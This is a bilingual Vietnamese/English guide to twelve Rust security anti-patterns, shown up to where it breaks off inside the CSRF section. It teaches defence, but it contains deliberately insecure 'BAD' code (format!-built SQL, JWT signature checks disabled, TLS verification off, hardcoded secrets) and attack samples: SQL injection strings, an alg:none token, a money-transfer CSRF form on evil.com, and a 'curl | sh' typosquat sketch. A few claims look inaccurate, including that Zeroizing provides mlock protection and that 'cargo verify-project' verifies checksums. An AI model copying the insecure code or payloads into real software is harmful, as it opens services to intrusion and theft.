# Lĩnh vực 04: Bảo Mật Và Xác Thực
# Domain 04: Security & Auth

> **Lĩnh vực:** Bảo Mật và Xác Thực
> **Số mẫu:** 12
> **Ngôn ngữ:** Rust
> **Ngày cập nhật:** 2026-02-18

---

## Tổng quan

Bảo mật trong Rust không tự động được đảm bảo bởi borrow checker — các lỗi logic, cryptographic mistakes, và thiếu sót trong validation vẫn xảy ra. Domain này tập trung vào các lỗi bảo mật phổ biến nhất trong Rust web services và CLI tools: từ timing attacks đến supply chain risks, từ SQL injection đến XSS.

---

## Mục lục

| #  | Tên mẫu | Mức độ |
|----|---------|--------|
| SA-01 | Timing Side-Channel (Non-constant-time comparison) | 🔴 CRITICAL |
| SA-02 | Zeroize Secrets Thiếu (Missing secret zeroization) | 🟠 HIGH |
| SA-03 | Dependency Audit Thiếu (cargo audit) | 🟠 HIGH |
| SA-04 | Supply Chain Attack Qua Crate Registry | 🔴 CRITICAL |
| SA-05 | SQL Injection Với format! | 🔴 CRITICAL |
| SA-06 | JWT Validation Thiếu | 🔴 CRITICAL |
| SA-07 | TLS Certificate Verification Disabled | 🟠 HIGH |
| SA-08 | Hardcoded Secrets | 🔴 CRITICAL |
| SA-09 | CSRF Protection Thiếu | 🟠 HIGH |
| SA-10 | Path Traversal | 🔴 CRITICAL |
| SA-11 | Insecure Random (rand vs OsRng) | 🟠 HIGH |
| SA-12 | XSS Trong Web Framework (Actix/Axum) | 🔴 CRITICAL |

---

## SA-01: Timing Side-Channel (Non-constant-time comparison)

### 1. Tên

**Timing Side-Channel** (So sánh không constant-time)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Cryptographic Vulnerability / Side-Channel
- **Mã định danh:** SA-01

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Cho phép kẻ tấn công đo thời gian phản hồi để suy ra secret tokens, HMAC signatures, hoặc passwords từ xa. Khai thác được thực hiện qua mạng với đủ mẫu thống kê.

### 4. Vấn đề

Rust `==` trên `String` và `&[u8]` dừng sớm khi gặp byte khác nhau (short-circuit evaluation). Kẻ tấn công gửi hàng triệu request với token khác nhau từng byte, đo thời gian phản hồi, suy ra token đúng byte-by-byte.

```
Kẻ tấn công                    Server
     │                             │
     │ token = "AAAA..." ──────────▶│ so sánh: 'A' vs 'X' → FAIL ở byte 0
     │ ◀──────────────── 1.001ms ───│
     │                             │
     │ token = "XAAA..." ──────────▶│ so sánh: 'X' == 'X', 'A' vs 'B' → FAIL ở byte 1
     │ ◀──────────────── 1.002ms ───│
     │                             │   ← +0.001ms = byte 0 đúng!
     │                             │
     │ ... lặp lại cho từng byte ..│
     │                             │
     │ token = "XY3z..." ──────────▶│ PASS — toàn bộ token bị leak
     │ ◀──────────────── SUCCESS ───│
```

### 5. Phát hiện

```bash
# Tìm so sánh trực tiếp trên token/secret/hmac
rg --type rust '(token|secret|hmac|hash|signature|api_key)\s*==\s*'

# Tìm dùng == trên Vec<u8> hoặc String trong context auth
rg --type rust 'if\s+\w*(token|secret|key|sig)\w*\s*=='

# Tìm PartialEq derive trên struct chứa sensitive fields
rg --type rust '#\[derive\(.*PartialEq.*\)\]' -A 5 | grep -i 'secret\|token\|password'
```

### 6. Giải pháp

```rust
// ❌ BAD: Short-circuit comparison — timing side-channel
fn verify_api_token(provided: &str, expected: &str) -> bool {
    provided == expected  // dừng ở byte đầu tiên khác nhau!
}

fn verify_hmac(provided: &[u8], expected: &[u8]) -> bool {
    provided == expected  // tương tự
}

// ✅ GOOD: Constant-time comparison với crate `subtle`
use subtle::ConstantTimeEq;

fn verify_api_token(provided: &str, expected: &str) -> bool {
    let provided_bytes = provided.as_bytes();
    let expected_bytes = expected.as_bytes();
    // Luôn so sánh toàn bộ, không dừng sớm
    bool::from(provided_bytes.ct_eq(expected_bytes))
}

fn verify_hmac(provided: &[u8], expected: &[u8]) -> bool {
    bool::from(provided.ct_eq(expected))
}

// ✅ GOOD: Dùng hmac crate đã tích hợp constant-time verify
use hmac::{Hmac, Mac};
use sha2::Sha256;

fn verify_request_hmac(
    secret: &[u8],
    message: &[u8],
    provided_sig: &[u8],
) -> Result<(), &'static str> {
    let mut mac = Hmac::<Sha256>::new_from_slice(secret)
        .map_err(|_| "invalid key length")?;
    mac.update(message);
    // verify_slice dùng constant-time comparison nội bộ
    mac.verify_slice(provided_sig).map_err(|_| "invalid signature")
}
```

### 7. Phòng ngừa

```toml
# Cargo.toml — thêm subtle cho constant-time ops
[dependencies]
subtle = "2"
hmac = "0.12"
sha2 = "0.10"
```

```bash
# Clippy không bắt được lỗi này — cần review thủ công
# Dùng cargo-audit để check crates với known timing issues
cargo audit

# Thêm vào CI
cargo install cargo-audit
cargo audit --deny warnings
```

---

## SA-02: Zeroize Secrets Thiếu (Missing secret zeroization)

### 1. Tên

**Zeroize Secrets Thiếu** (Missing secret zeroization)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Memory Security / Secret Management
- **Mã định danh:** SA-02

### 3. Mức nghiêm trọng

🟠 **HIGH** — Secrets (passwords, private keys, session tokens) tồn tại trong RAM sau khi dùng xong. Kẻ tấn công có thể dump process memory, swap file, hoặc core dump để lấy lại.

### 4. Vấn đề

Khi `String` hoặc `Vec<u8>` chứa secret bị drop, Rust chỉ giải phóng memory allocator — nội dung bytes vẫn còn trong RAM cho đến khi bị ghi đè. Compiler cũng có thể optimize away manual zeroing vì nó coi đó là "dead store".

```
Vòng đời secret trong memory (KHÔNG zeroize):

  t=0  ┌─────────────────────┐
       │ password = "s3cr3t" │  ← secret tồn tại
  t=1  │ authenticate(...)   │
  t=2  │ password dropped    │  ← allocator freed, nhưng bytes còn đó!
  t=3  │ ... other code ...  │
  t=? ┌──────────────────────┴─────────────────────┐
      │ /proc/PID/mem dump:                        │
      │ 0x7fff1234: 73 33 63 72 33 74 ("s3cr3t")  │ ← vẫn readable!
      └────────────────────────────────────────────┘
```

### 5. Phát hiện

```bash
# Tìm String/Vec chứa tên gợi ý sensitive data không dùng zeroize
rg --type rust 'let\s+(mut\s+)?(password|secret|private_key|token|seed|mnemonic)\s*:'

# Tìm struct sensitive không derive Zeroize
rg --type rust 'struct\s+\w*(Key|Secret|Password|Credential)' -A 10 | grep -v 'Zeroize'

# Kiểm tra Cargo.toml có zeroize chưa
grep -r 'zeroize' Cargo.toml || echo "MISSING: zeroize crate"
```

### 6. Giải pháp

```rust
// ❌ BAD: Secret tồn tại trong memory sau khi drop
fn authenticate(password: String) -> bool {
    let hash = compute_hash(&password);
    verify_hash(hash)
    // password dropped đây — nhưng bytes "s3cr3t" vẫn còn trong heap!
}

struct PrivateKey {
    bytes: Vec<u8>,  // không zeroize khi drop
}

// ✅ GOOD: Dùng zeroize crate
use zeroize::{Zeroize, ZeroizeOnDrop};

fn authenticate(mut password: String) -> bool {
    let result = {
        let hash = compute_hash(&password);
        verify_hash(hash)
    };
    password.zeroize();  // ghi đè bằng zeros trước khi drop
    result
}

// ✅ GOOD: Struct tự động zeroize khi drop
#[derive(Zeroize, ZeroizeOnDrop)]
struct PrivateKey {
    bytes: Vec<u8>,
}

// ✅ GOOD: Dùng secrecy crate cho type-safe secret handling
use secrecy::{Secret, ExposeSecret};

fn login(password: Secret<String>, stored_hash: &str) -> bool {
    // Chỉ expose khi thực sự cần
    let input = password.expose_secret();
    bcrypt::verify(input, stored_hash).unwrap_or(false)
    // Secret tự zeroize khi drop
}

// ✅ GOOD: Protect sensitive data với mlock (không bị swap ra disk)
use zeroize::Zeroizing;

fn generate_session_key() -> Zeroizing<Vec<u8>> {
    let mut key = Zeroizing::new(vec![0u8; 32]);
    rand::rngs::OsRng.fill_bytes(&mut key);
    key  // tự động zeroize khi hàm return về caller drop nó
}
```

### 7. Phòng ngừa

```toml
# Cargo.toml
[dependencies]
zeroize = { version = "1", features = ["derive"] }
secrecy = "0.8"
```

```bash
# Kiểm tra struct sensitive có Zeroize không
rg --type rust '#\[derive\(' | grep -v Zeroize | grep -i 'key\|secret\|credential'

# cargo-geiger để tìm unsafe code có thể ảnh hưởng memory safety
cargo install cargo-geiger
cargo geiger
```

---

## SA-03: Dependency Audit Thiếu (cargo audit)

### 1. Tên

**Dependency Audit Thiếu** (Missing cargo audit)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Supply Chain / Dependency Management
- **Mã định danh:** SA-03

### 3. Mức nghiêm trọng

🟠 **HIGH** — Dùng crate có CVE đã biết mà không hay. Kẻ tấn công khai thác vulnerability trong dependency, không cần tấn công code của bạn trực tiếp.

### 4. Vấn đề

Rust ecosystem có hàng trăm nghìn crates. Nhiều crate phổ biến đã có CVE (openssl, hyper, tokio cũ). Không có `cargo audit` trong CI đồng nghĩa với việc dùng vulnerable dependencies mà không biết.

```
Dependency tree không được audit:

  your-app
    ├── actix-web 3.3.2  ──▶ CVE-2021-XXXXX (DoS via header parsing)
    ├── openssl 0.10.30  ──▶ CVE-2022-XXXXX (memory corruption)
    └── serde_json 1.0.1 ──▶ không có CVE, nhưng outdated
         └── itoa 0.4.0  ──▶ CVE-2021-XXXXX (integer overflow)

  Không có cargo audit = không biết 3 trong 4 deps có vulnerability!
```

### 5. Phát hiện

```bash
# Chạy ngay để kiểm tra
cargo audit

# Kiểm tra CI có audit không
rg 'cargo audit' .github/ .gitlab-ci.yml Makefile CI/ 2>/dev/null || echo "MISSING: cargo audit in CI"

# Tìm lock file để verify audit hoạt động
ls Cargo.lock || echo "MISSING: Cargo.lock (cannot audit without lock file)"
```

### 6. Giải pháp

```bash
# Cài đặt
cargo install cargo-audit

# Chạy audit
cargo audit

# Audit với deny để fail CI khi có issue
cargo audit --deny warnings

# Tự động fix một số vulnerabilities (update deps)
cargo audit fix

# Xem chi tiết một advisory cụ thể
cargo audit --json | jq '.vulnerabilities.list[]'
```

```yaml
# .github/workflows/security.yml — CI audit
name: Security Audit

on:
  push:
    paths: ['Cargo.lock', 'Cargo.toml']
  schedule:
    - cron: '0 6 * * 1'  # Thứ 2 hàng tuần

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: rustsec/audit-check@v1
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
```

```toml
# audit.toml — bỏ qua advisory đã được đánh giá + chấp nhận rủi ro
[advisories]
ignore = [
    "RUSTSEC-2023-0001",  # Lý do: chỉ ảnh hưởng feature X không dùng
]
```

### 7. Phòng ngừa

```bash
# Thêm vào pre-commit hook
echo 'cargo audit' >> .git/hooks/pre-push
chmod +x .git/hooks/pre-push

# Dùng cargo-deny thay thế (mạnh hơn, bao gồm license check)
cargo install cargo-deny
cargo deny check advisories
cargo deny check licenses
```

---

## SA-04: Supply Chain Attack Qua Crate Registry

### 1. Tên

**Supply Chain Attack Qua Crate Registry** (Typosquatting & Malicious Crates)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Supply Chain / Dependency Confusion
- **Mã định danh:** SA-04

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Cài nhầm crate độc hại chạy arbitrary code lúc build hoặc runtime. Ảnh hưởng toàn bộ production environment, có thể dẫn đến data breach toàn hệ thống.

### 4. Vấn đề

Kẻ tấn công publish crate với tên gần giống crate phổ biến (typosquatting: `serde_json` → `serde-json`, `tokio` → `tok10`). Build scripts (`build.rs`) chạy tự động và có quyền execute arbitrary code.

```
Typosquatting attack vector:

  Crate thật:    serde_json    openssl    tokio
  Crate giả:     serde-json    openss1    tok10
                     │             │         │
                     ▼             ▼         ▼
              build.rs chạy tự động → exec curl | sh
                     │
              ┌──────┴──────────────────┐
              │ Attacker's server       │
              │ nhận: env vars, secrets │
              │ cài: backdoor, miner    │
              └─────────────────────────┘
```

### 5. Phát hiện

```bash
# Kiểm tra crate name có dùng hyphen thay underscore không (potential typosquat)
rg 'serde-json|open-ssl|actix-rt' Cargo.toml

# Verify checksum của dependencies
cargo verify-project

# Kiểm tra tất cả crates trong lock file
cargo tree --edges all

# Tìm build.rs scripts trong dependencies (có thể chạy arbitrary code)
cargo build -v 2>&1 | grep 'build.rs'

# Kiểm tra crate owners trên crates.io trước khi dùng
# cargo-crate-info (nếu cài)
cargo search <crate-name>
```

### 6. Giải pháp

```toml
# ❌ BAD: Dùng tên crate không verify, version quá rộng
[dependencies]
serde-json = "*"          # typosquat của serde_json!
tok10 = "1"              # typosquat của tokio!
rand = ">= 0.1"          # quá rộng, có thể pull malicious version

# ✅ GOOD: Dùng đúng tên, pin version, verify checksum
[dependencies]
serde_json = "1.0.114"   # đúng tên với underscore
tokio = { version = "1.36", features = ["full"] }
rand = "0.8.5"           # pin exact minor version
```

```toml
# .cargo/config.toml — sử dụng private registry hoặc mirror tin cậy
[source.crates-io]
replace-with = "vendored-sources"  # hoặc private mirror

[source.vendored-sources]
directory = "vendor"               # vendor tất cả deps vào repo

# Hoặc dùng sparse registry với authentication
[registries.private]
index = "sparse+https://registry.company.com/index/"
```

```bash
# Vendor tất cả dependencies vào repo (supply chain isolation)
cargo vendor
# Sau đó thêm vào .cargo/config.toml:
# [source.crates-io]
# replace-with = "vendored-sources"

# Dùng cargo-crev cho peer-reviewed dependencies
cargo install cargo-crev
cargo crev repo fetch trusted

# Kiểm tra crate trước khi thêm
cargo crev crate verify <crate-name>
```

### 7. Phòng ngừa

```bash
# Lock Cargo.lock vào version control (MANDATORY)
git add Cargo.lock
git commit -m "lock: pin dependency versions"

# Dùng cargo-deny với allowed list
cat > deny.toml << 'EOF'
[bans]
multiple-versions = "warn"
wildcards = "deny"

[sources]
unknown-registry = "deny"
unknown-git = "deny"
EOF

cargo deny check
```

---

## SA-05: SQL Injection Với format!

### 1. Tên

**SQL Injection Với format!** (SQL Injection via String Formatting)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Injection / Database Security
- **Mã định danh:** SA-05

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Cho phép kẻ tấn công đọc/ghi/xóa toàn bộ database, bypass authentication, hoặc execute OS commands nếu database có quyền.

### 4. Vấn đề

Rust không có built-in ORM magic, nhưng vẫn có thể mắc SQL injection nếu dùng `format!` để build query string. Bất kỳ user input nào được nối trực tiếp vào SQL đều là injection risk.

```
SQL Injection flow:

  Input:    username = "admin' OR '1'='1"

  format!:  "SELECT * FROM users WHERE name='admin' OR '1'='1'"
                                            ──────────────────
                                            Luôn true! Bypass auth!

  Kẻ tấn công:  username = "'; DROP TABLE users; --"
  Query:    "SELECT * FROM users WHERE name=''; DROP TABLE users; --'"
                                               ─────────────────────
                                               Xóa toàn bộ users table!
```

### 5. Phát hiện

```bash
# Tìm format! với SQL keywords
rg --type rust 'format!\s*\(\s*"[^"]*SELECT[^"]*\{'
rg --type rust 'format!\s*\(\s*"[^"]*INSERT[^"]*\{'
rg --type rust 'format!\s*\(\s*"[^"]*UPDATE[^"]*\{'
rg --type rust 'format!\s*\(\s*"[^"]*DELETE[^"]*\{'

# Tìm string concatenation với SQL
rg --type rust '"SELECT.*"\s*\+\s*'
rg --type rust 'query\.push_str'

# Tìm execute với formatted string
rg --type rust '(execute|query)\s*\(&format!'
```

### 6. Giải pháp

```rust
// ❌ BAD: SQL Injection via format!
use sqlx::PgPool;

async fn find_user(pool: &PgPool, username: &str) -> Result<User, sqlx::Error> {
    let query = format!(
        "SELECT * FROM users WHERE username = '{}'",
        username  // INJECTION! username có thể chứa SQL
    );
    sqlx::query_as::<_, User>(&query).fetch_one(pool).await
}

async fn login(pool: &PgPool, username: &str, password: &str) -> bool {
    let sql = format!(
        "SELECT COUNT(*) FROM users WHERE username='{}' AND password='{}'",
        username, password  // Double injection!
    );
    // ...
}

// ✅ GOOD: Parameterized queries với sqlx
use sqlx::PgPool;

async fn find_user(pool: &PgPool, username: &str) -> Result<User, sqlx::Error> {
    // $1 là placeholder — không thể inject
    sqlx::query_as!(User,
        "SELECT * FROM users WHERE username = $1",
        username
    )
    .fetch_one(pool)
    .await
}

// ✅ GOOD: Dùng query builder nếu cần dynamic queries
use sea_query::{Expr, Query, PostgresQueryBuilder};

fn build_user_query(filters: &UserFilters) -> String {
    let mut query = Query::select();
    query.from(Users::Table).column(Users::Id).column(Users::Name);

    if let Some(ref username) = filters.username {
        // sea_query tự escape
        query.and_where(Expr::col(Users::Username).eq(username.as_str()));
    }
    if let Some(age) = filters.min_age {
        query.and_where(Expr::col(Users::Age).gte(age));
    }
    query.to_string(PostgresQueryBuilder)
}

// ✅ GOOD: Whitelist cho dynamic column/table names (không thể parameterize)
fn safe_order_by(column: &str) -> Result<&'static str, &'static str> {
    match column {
        "name" => Ok("name"),
        "created_at" => Ok("created_at"),
        "email" => Ok("email"),
        _ => Err("invalid sort column"),
    }
}
```

### 7. Phòng ngừa

```bash
# Tìm tất cả SQL format! trong codebase
rg --type rust 'format!.*(?i)(select|insert|update|delete|where|from)'

# Dùng sqlx compile-time query checking
# query! macro sẽ fail tại compile time nếu SQL sai
# Requires DATABASE_URL trong environment

# Thêm clippy lint tùy chỉnh (nếu có custom lints)
# Hoặc dùng cargo-semgrep với ruleset SQL injection
```

```toml
# Cargo.toml — dùng ORM thay raw SQL
[dependencies]
sqlx = { version = "0.7", features = ["runtime-tokio", "postgres", "macros"] }
# Hoặc
sea-orm = "0.12"
# Hoặc
diesel = { version = "2", features = ["postgres"] }
```

---

## SA-06: JWT Validation Thiếu

### 1. Tên

**JWT Validation Thiếu** (Insufficient JWT Validation)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Authentication / Token Validation
- **Mã định danh:** SA-06

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Cho phép bypass authentication, leo thang đặc quyền, hoặc forge tokens. Kẻ tấn công có thể tự tạo JWT với bất kỳ claims nào.

### 4. Vấn đề

JWT gồm 3 phần: header.payload.signature. Validation không đầy đủ dẫn đến: chấp nhận "alg: none" (không có signature), không check expiration, không verify algorithm header, không validate issuer/audience.

```
JWT Attack vectors:

  1. Algorithm None Attack:
     header: {"alg": "none", "typ": "JWT"}
     payload: {"sub": "admin", "role": "superuser"}
     signature: (empty)
     → Server thiếu validation chấp nhận token giả!

  2. Algorithm Confusion (RS256 → HS256):
     Attacker dùng public key (đã biết) như HMAC secret
     → Server verify thành công với public key!

  3. Expired Token:
     exp: 1000000 (đã qua từ năm 2001)
     → Server không check exp, vẫn accept!
```

### 5. Phát hiện

```bash
# Tìm JWT decode không validation
rg --type rust 'decode\s*\(' | grep -i 'jwt\|token'

# Tìm dangerous: skip validation hoặc insecure config
rg --type rust 'Validation::new\|Validation::default'
rg --type rust 'insecure_disable\|dangerous\|no_expiry'

# Tìm manual JWT parsing (parsing mà không decode)
rg --type rust 'split\s*\(\s*'"'"'\.\s*'"'"'\s*\)' | grep -i 'jwt\|token\|bearer'
```

### 6. Giải pháp

```rust
// ❌ BAD: Decode không validate algorithm, không check claims
use jsonwebtoken::{decode, DecodingKey, Validation};

fn parse_token_insecure(token: &str, secret: &[u8]) -> Option<Claims> {
    let mut validation = Validation::default();
    validation.insecure_disable_signature_validation();  // !!! BỎ SIGNATURE CHECK
    // validation.algorithms không set → accept mọi algorithm kể cả "none"

    decode::<Claims>(token, &DecodingKey::from_secret(secret), &validation)
        .ok()
        .map(|d| d.claims)
}

// ❌ BAD: Không check expiration
fn parse_token_no_exp(token: &str, secret: &[u8]) -> Option<Claims> {
    let mut validation = Validation::default();
    validation.validate_exp = false;  // Chấp nhận expired token!
    // ...
}

// ✅ GOOD: Strict validation với jsonwebtoken
use jsonwebtoken::{decode, DecodingKey, Validation, Algorithm};
use serde::{Deserialize, Serialize};

#[derive(Debug, Deserialize, Serialize)]
struct Claims {
    sub: String,
    exp: usize,  // expiration (required)
    iat: usize,  // issued at (required)
    iss: String, // issuer (required)
    aud: String, // audience (required)
    role: String,
}

fn verify_jwt(token: &str, secret: &[u8]) -> Result<Claims, AuthError> {
    let mut validation = Validation::new(Algorithm::HS256);
    // Chỉ chấp nhận HS256 — chặn algorithm confusion
    validation.algorithms = vec![Algorithm::HS256];
    // validate_exp = true by default — kiểm tra expiration
    // validate_nbf = true — not before check
    validation.set_issuer(&["https://auth.myapp.com"]);
    validation.set_audience(&["myapp-api"]);

    let token_data = decode::<Claims>(
        token,
        &DecodingKey::from_secret(secret),
        &validation,
    ).map_err(|e| AuthError::InvalidToken(e.to_string()))?;

    Ok(token_data.claims)
}

// ✅ GOOD: RS256 với public key (asymmetric)
fn verify_jwt_rs256(token: &str, public_key_pem: &[u8]) -> Result<Claims, AuthError> {
    let mut validation = Validation::new(Algorithm::RS256);
    validation.algorithms = vec![Algorithm::RS256];  // Chỉ RS256
    validation.set_issuer(&["https://auth.myapp.com"]);

    let decoding_key = DecodingKey::from_rsa_pem(public_key_pem)
        .map_err(|e| AuthError::KeyError(e.to_string()))?;

    decode::<Claims>(token, &decoding_key, &validation)
        .map(|d| d.claims)
        .map_err(|e| AuthError::InvalidToken(e.to_string()))
}
```

### 7. Phòng ngừa

```toml
# Cargo.toml
[dependencies]
jsonwebtoken = "9"
```

```bash
# Kiểm tra config Validation không có insecure flags
rg --type rust 'insecure_disable\|validate_exp\s*=\s*false'

# Test với token có alg:none — phải bị reject
# Test với expired token — phải bị reject
# Test với wrong issuer — phải bị reject
```

---

## SA-07: TLS Certificate Verification Disabled

### 1. Tên

**TLS Certificate Verification Disabled** (Vô hiệu hóa xác minh TLS)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Transport Security / TLS
- **Mã định danh:** SA-07

### 3. Mức nghiêm trọng

🟠 **HIGH** — Cho phép Man-in-the-Middle attack. Kẻ tấn công intercept và đọc/modify toàn bộ HTTPS traffic, bao gồm credentials, tokens, sensitive data.

### 4. Vấn đề

Developer thường disable TLS verification để "fix" lỗi certificate trong development, sau đó code này lọt vào production. `danger_accept_invalid_certs(true)` vô hiệu hóa toàn bộ certificate chain validation.

```
MITM với TLS disabled:

  App                    Attacker                Server
   │                        │                      │
   │──── HTTPS request ─────▶│                      │
   │                        │──── forward ─────────▶│
   │                        │◀──── response ────────│
   │◀── modified response ──│                      │
   │                        │                      │
   │ App không verify cert  │
   │ → tin tưởng Attacker!  │
   │ → data bị đọc/sửa      │
```

### 5. Phát hiện

```bash
# Tìm TLS verification disabled trong reqwest
rg --type rust 'danger_accept_invalid_certs\s*\(\s*true'
rg --type rust 'danger_accept_invalid_hostnames\s*\(\s*true'

# Tìm trong hyper/native-tls
rg --type rust 'accept_invalid_certs\|verify\s*=\s*false\|TlsConnector.*danger'

# Tìm self-signed cert bypass
rg --type rust 'add_root_certificate\|rustls.*dangerous'

# Tìm environment variable cho TLS skip (thường quên xóa)
rg 'REQWEST_DANGER_ACCEPT_INVALID_CERTS\|NODE_TLS_REJECT_UNAUTHORIZED'
```

### 6. Giải pháp

```rust
// ❌ BAD: TLS verification disabled
use reqwest::Client;

async fn create_insecure_client() -> Client {
    Client::builder()
        .danger_accept_invalid_certs(true)   // KHÔNG BAO GIỜ trong production!
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap()
}

// ✅ GOOD: Default client với full TLS verification
use reqwest::Client;

async fn create_secure_client() -> Result<Client, reqwest::Error> {
    Client::builder()
        // TLS verification enabled by default
        .timeout(std::time::Duration::from_secs(30))
        .build()
}

// ✅ GOOD: Custom CA cho internal services (thay vì disable verification)
use reqwest::Client;

async fn create_client_with_custom_ca(ca_cert_pem: &[u8]) -> Result<Client, reqwest::Error> {
    let cert = reqwest::Certificate::from_pem(ca_cert_pem)?;

    Client::builder()
        .add_root_certificate(cert)  // Thêm CA, không disable verification
        // Vẫn verify cert chain, chỉ trust thêm CA này
        .build()
}

// ✅ GOOD: Rustls với strict settings
use reqwest::Client;

fn create_rustls_client() -> Result<Client, reqwest::Error> {
    Client::builder()
        .use_rustls_tls()   // Dùng rustls thay native-tls
        .https_only(true)   // Chặn HTTP không encrypted
        .build()
}

// ✅ ACCEPTABLE: Chỉ disable trong test với feature flag
#[cfg(test)]
fn test_client() -> Client {
    Client::builder()
        .danger_accept_invalid_certs(true)  // Chỉ trong test!
        .build()
        .unwrap()
}
```

### 7. Phòng ngừa

```bash
# Pre-commit check
rg 'danger_accept_invalid' --type rust && echo "ERROR: TLS disabled!" && exit 1

# Clippy custom lint (nếu dùng clippy plugin)
# Hoặc dùng grep trong CI
grep -r "danger_accept_invalid_certs(true)" src/ && exit 1

# Dùng RUSTLS_LOG=trace để debug TLS issues thay vì disable
RUSTLS_LOG=trace cargo run 2>&1 | grep -i 'tls\|cert'
```

---

## SA-08: Hardcoded Secrets

### 1. Tên

**Hardcoded Secrets** (Secrets được hardcode trong source code)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Secret Management / Configuration Security
- **Mã định danh:** SA-08

### 3. Mức nghiêm trọng

🔴 **CRITICAL** — Secret trong source code tự động lọt vào git history, logs, binaries. Bất kỳ ai có quyền đọc repo (kể cả sau khi xóa commit) đều có thể lấy được.

### 4. Vấn đề

Hardcoded secrets phổ biến hơn bạn nghĩ: API keys, database passwords, JWT secrets, private keys, webhook secrets. Kể cả khi commit đã bị xóa, git history vẫn chứa secret. GitHub scanning và automated tools liên tục quét public repos.

```
Secret lifecycle sau khi commit:

  Code: let jwt_secret = "super_secret_key_123";
          │
          ▼ git commit
  Git history: mãi mãi chứa secret (ngay cả sau khi xóa!)
          │
          ├──▶ GitHub scans public repos 24/7
          ├──▶ git clone bởi contributor
          ├──▶ CI/CD logs có thể print source
          ├──▶ Binary có thể bị reverse engineered
          └──▶ strings(1) trên binary lộ secret
```

### 5. Phát hiện

```bash
# Tìm hardcoded patterns phổ biến
rg --type rust '"[A-Za-z0-9+/]{32,}"'  # Base64 keys
rg --type rust '"sk-[a-zA-Z0-9]{40,}"'  # OpenAI/Anthropic keys
rg --type rust '"(password|secret|api_key|token)\s*=\s*"[^"]+'
rg --type rust 'const\s+(SECRET|KEY|TOKEN|PASSWORD)\s*:\s*&str\s*=\s*"'

# Dùng git-secrets hoặc trufflehog
trufflehog git file://. --since-commit HEAD~10

# Dùng detect-secrets
detect-secrets scan --all-files
```

### 6. Giải pháp

```rust
// ❌ BAD: Hardcoded secrets
const JWT_SECRET: &str = "my_super_secret_jwt_key_do_not_share";
const DB_PASSWORD: &str = "admin123";
const API_KEY: &str = "sk-proj-abc123xyz789...";

fn connect_db() -> Pool {
    Pool::connect("postgres://admin:hardcoded_pass@localhost/db")
}

// ✅ GOOD: Environment variables
use std::env;

fn get_jwt_secret() -> String {
    env::var("JWT_SECRET")
        .expect("JWT_SECRET environment variable must be set")
}

fn get_db_url() -> String {
    env::var("DATABASE_URL")
        .expect("DATABASE_URL environment variable must be set")
}

// ✅ GOOD: Dùng config crate với env support
use config::{Config, Environment, File};
use serde::Deserialize;

#[derive(Deserialize)]
struct AppConfig {
    jwt_secret: String,
    database_url: String,
    api_key: String,
}

fn load_config() -> Result<AppConfig, config::ConfigError> {
    Config::builder()
        // Default values từ file (không chứa secrets)
        .add_source(File::with_name("config/default"))
        // Override với env vars (chứa secrets)
        .add_source(Environment::with_prefix("APP").separator("__"))
        .build()?
        .try_deserialize()
}

// ✅ GOOD: Dùng secret manager (AWS Secrets Manager, Vault, etc.)
async fn get_secret_from_vault(secret_name: &str) -> Result<String, VaultError> {
    let client = VaultClient::new(
        env::var("VAULT_ADDR").expect("VAULT_ADDR required"),
        env::var("VAULT_TOKEN").expect("VAULT_TOKEN required"),
    )?;
    client.get_secret(secret_name).await
}
```

```gitignore
# .gitignore — LUÔN exclude secret files
.env
.env.local
.env.production
*.pem
*.key
config/secrets.toml
secrets/
```

### 7. Phòng ngừa

```bash
# Cài git-secrets để chặn commit chứa secrets
git secrets --install
git secrets --register-aws  # Patterns cho AWS keys

# Scan toàn bộ git history
trufflehog git file://. --only-verified

# Dùng pre-commit hook
pip install detect-secrets
detect-secrets scan > .secrets.baseline
pre-commit install
```

---

## SA-09: CSRF Protection Thiếu

### 1. Tên

**CSRF Protection Thiếu** (Missing Cross-Site Request Forgery Protection)

### 2. Phân loại

- **Lĩnh vực:** Security & Auth
- **Danh mục con:** Web Security / Request Forgery
- **Mã định danh:** SA-09

### 3. Mức nghiêm trọng

🟠 **HIGH** — Kẻ tấn công trick user thực hiện actions không mong muốn (chuyển tiền, đổi email, xóa data) từ website của kẻ tấn công, sử dụng session cookie của user.

### 4. Vấn đề

CSRF xảy ra khi API dùng cookie-based auth mà không có CSRF token. Browser tự động gửi cookies khi request, nên trang web độc hại có thể trigger API calls thay mặt user mà không cần credentials.

```
CSRF Attack flow:

  User đăng nhập: mybank.com → nhận session cookie
  User visit: evil.com
  evil.com HTML:
    <form action="https://mybank.com/transfer" method="POST">
      <input name="amount" value="10000">
      <input name="to" value="attacker_account">
    </form>
    <script>document.forms[0].submit()</script>

  Browser tự gửi: POST mybank.com/transfer
                  Cookie: session=valid_session  ← browser gửi tự động!

  mybank.com nhận request hợp lệ (có session) → chuyển tiền!
```

### 5. Phát hiện

```bash
# Tìm state-changing endpoints (POST/PUT/DELETE) trong Actix/Axum
rg --type rust 'web::post\(\)\|web::put\(\)\|web::delete\(\)'
rg --type rust '\.post\(|\.put\(|\.delete\(' | grep -i 'route\|handler'

# Kiểm tra có middleware CSRF không
rg --type rust 'csrf\|CsrfMiddleware\|CsrfLayer' || echo "MISSING: CSRF protection"

# Tìm endpoints dùng cookie auth mà không check CSRF token
rg --type rust 'HttpOnly\|SameSite\|Cookie'
```

### 6. Giải pháp

```rust
// ❌ BAD: POST endpoint không có CSRF protection
use actix_web::{web, HttpResponse};

async fn transfer_money(
    form: web::Form<TransferForm>,
    session: Session,  // Cookie-based auth, vulnerable to CSRF!
) -> HttpResponse {
